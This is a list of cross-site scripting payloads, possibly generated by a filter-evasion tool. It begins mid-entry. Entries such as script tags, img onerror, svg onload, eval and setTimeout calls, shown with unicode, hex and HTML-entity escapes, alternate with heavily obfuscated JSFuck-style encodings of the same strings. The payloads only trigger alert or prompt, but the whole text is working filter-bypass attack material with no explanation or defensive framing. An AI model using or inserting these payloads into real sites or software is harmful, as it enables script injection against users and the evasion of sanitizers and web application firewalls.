String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
setTimeout("JSCode")
(false+"")[3]+(true+"")[3]+(true+"")[0]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
setInterval("JSCode")
(false+"")[3]+(true+"")[3]+(true+"")[0]+([false]+"")[10]+(undefined+"")[1]+(true+"")[0]+(true+"")[3]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
setImmediate("JSCode")
(false+"")[3]+(true+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(true+"")[3]+([][""]+"")[4]+([false]+"")[10]+(false+"")[1]+(true+"")[0]+(true+"")[3]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
Function("JSCode")
(false+"")[0]+(undefined+"")[0]+(undefined+"")[1]+([false]+"")[3]+(true+"")[0]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
/ale/.source+/rt/.source
[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]
String.FromCharCode(97,108,101,114,116)
(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(false+"")[0]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([false]+"")[3]+(+(101))["to"+String["name"]]()[1]+(false+"")[1]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
atob("YWxlcnQ=")
(false+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[2]+([false]+"")[3]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]
17795081..toString(36)
(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[3]+(true+"")[0]+(true+"")[1]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]
<script>\u0061lert(303)</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>\x0061\u006C\u0065\u0072\u0074(305)</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>eval("\u0061lert(307)")</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>eval("\x0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="\u0061lert(311)""/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('\141lert(313)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('\x61lert(315)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('&#x0061;lert(317)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('&#97;lert(319)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('\a\l\ert\(1\)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(true+"")[3]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[11]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload%09=prompt(325)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg %09onload=prompt(327)>
